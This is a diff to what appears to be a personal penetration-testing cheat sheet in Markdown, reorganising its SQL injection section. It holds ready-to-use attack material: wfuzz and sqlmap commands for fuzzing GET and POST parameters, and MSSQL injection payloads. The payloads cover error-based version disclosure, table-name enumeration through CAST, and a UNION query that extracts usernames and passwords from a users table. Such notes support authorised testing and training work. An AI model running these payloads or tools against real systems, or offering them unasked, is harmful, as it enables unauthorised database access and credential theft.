@@ -120,12 +120,20 @@ fetch("login").then(res => res.text().then(data => {
 
 ## SQL Injection (SQLi)
 
+- Error-based payloads
+- UNION-based payloads
+- Stacked Queries
+- Reading and writing files
+- RCE
+
+## SQLi Fuzzing
 ### Fuzzing GET parameter
 `wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -u "$URL/index.php?id=FUZZ"`
 
 ### Fuzzing POST parameter
 `wfuzz -c -z file,/usr/share/wordlists/wfuzz/Injections/SQL.txt -d "id=FUZZ" -u "$URL/index.php"`
 
+## SQLMap quickies
 ### sqlmap GET parameter
 `sqlmap -u "$URL/index.php?id=1"`
 
@@ -133,8 +141,23 @@ fetch("login").then(res => res.text().then(data => {
 
 Copy POST request from Burp Suite into `post.req` file
 
-`sqlmap -r post.req -p parameter`
+```shell
+sqlmap -r post.req -p parameter`
+```
 
+
+## Example SQLi Statements:
+
+MSSQL error discovery: `inStock=1&name=test&sort=id&order=%foo') or id between 1 and 200-- %')`
+
+MSSQL version/error-based: `inStock=1&name=test ') or 1/@@version=LOWER('name&sort=id&order=asc`
+
+MSSQL 2: `inStock=CAST((SELECT+TOP+1+table_name+FROM+(Select+TOP+2+table_name+FROM+app.information_schema.tables+ORDER+BY+table_name)z+ORDER+BY+table_name+DESC)+as+varchar);&name=&sort=id&order=asc`
+
+UNION: `SELECT id, name, description, price FROM menu WHERE id = 0 UNION ALL SELECT id, username, password, 0 from users`
+
+
+### SQLi junk to sort/scrap
 SELECT * FROM menu WHERE name = 'Tostadas'
 
 SELECT id, name, description, price FROM menu WHERE name = 'foo'
@@ -149,15 +172,6 @@ Strings and functions
 
 ALL: %foo') or id between 1 and 200-- %')
 
-## Example SQLi Statements:
-
-MSSQL error discovery: `inStock=1&name=test&sort=id&order=%foo') or id between 1 and 200-- %')`
-
-MSSQL version/error-based: `inStock=1&name=test ') or 1/@@version=LOWER('name&sort=id&order=asc`
-
-MSSQL 2: `inStock=CAST((SELECT+TOP+1+table_name+FROM+(Select+TOP+2+table_name+FROM+app.information_schema.tables+ORDER+BY+table_name)z+ORDER+BY+table_name+DESC)+as+varchar);&name=&sort=id&order=asc`
-
-UNION: `SELECT id, name, description, price FROM menu WHERE id = 0 UNION ALL SELECT id, username, password, 0 from users`
 
 ## External XML Entities (XXE)
 
